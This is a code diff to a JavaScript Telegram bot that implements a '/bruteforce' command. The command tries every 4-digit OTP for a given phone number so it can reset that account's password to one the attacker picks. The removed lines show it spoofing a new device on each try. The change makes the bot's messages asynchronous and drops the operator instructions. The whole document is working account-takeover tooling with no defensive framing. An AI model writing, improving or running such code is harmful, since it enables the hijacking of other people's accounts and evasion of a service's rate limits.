@@ -746,7 +746,7 @@ Example:
     else if (text.startsWith('/bruteforce ')) {
       const parts = text.substring(12).trim().split(/\s+/);
       if (parts.length < 2) {
-        await bot.sendMessage(chatId, `Format: /bruteforce <phone> <newPassword> [start] [size]\nDefault: start 0, size 500\nSend OTP from app FIRST, then run this.\n\nExample:\n/bruteforce 6206785398 mypass123\n/bruteforce 6206785398 mypass123 500 500`);
+        await bot.sendMessage(chatId, `Format: /bruteforce <phone> <newPassword> [start] [size]\nDefault: start 0, size 500\n\nExample:\n/bruteforce 6206785398 mypass123\n/bruteforce 6206785398 mypass123 500 500`);
         return res.sendStatus(200);
       }
       const phone = parts[0];
@@ -784,7 +784,9 @@ Example:
       }
 
       const endRange = Math.min(startFrom + totalSize - 1, maxOtp);
-      await bot.sendMessage(chatId, `🔓 Brute force (device spoof)\nPhone: ${phone}\nRange: ${String(startFrom).padStart(4, '0')} → ${String(endRange).padStart(4, '0')}\n${totalSize} OTPs | Unique device per try\n⚠️ Send OTP from app first!`);
+      bot.sendMessage(chatId, `🔓 Brute force starting...\nPhone: ${phone}\nRange: ${String(startFrom).padStart(4, '0')} → ${String(endRange).padStart(4, '0')} (${totalSize} OTPs)`).catch(()=>{});
+
+      res.sendStatus(200);
 
       let found = false;
       let foundOtp = '';
@@ -810,22 +812,22 @@ Example:
             foundResp = JSON.stringify(result, null, 2);
           }
         } catch(e) {
-          await bot.sendMessage(chatId, `⚠️ Error at ${otp}: ${e.message}`);
+          bot.sendMessage(chatId, `⚠️ Error at ${otp}: ${e.message}`).catch(()=>{});
           break;
         }
       }
 
       if (found) {
-        await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n${tried} tried\n\nResponse:\n${foundResp.substring(0, 800)}`);
+        bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n${tried} tried\n\nResponse:\n${foundResp.substring(0, 800)}`).catch(()=>{});
       } else {
         const nextStart = startFrom + totalSize;
         if (nextStart <= maxOtp) {
-          await bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(4, '0')}-${String(endRange).padStart(4, '0')} (${tried} tried)\n\n⚠️ Send new OTP from app, then:\n/bruteforce ${phone} ${newPass} ${nextStart} ${totalSize}`);
+          bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(4, '0')}-${String(endRange).padStart(4, '0')} (${tried} tried)\n\nContinue:\n/bruteforce ${phone} ${newPass} ${nextStart} ${totalSize}`).catch(()=>{});
         } else {
-          await bot.sendMessage(chatId, `❌ All 4-digit OTPs exhausted. (${tried} tried)`);
+          bot.sendMessage(chatId, `❌ All 4-digit OTPs exhausted. (${tried} tried)`).catch(()=>{});
         }
       }
-      return res.sendStatus(200);
+      return;
     }
 
     else if (text.startsWith('/resetbrute ')) {
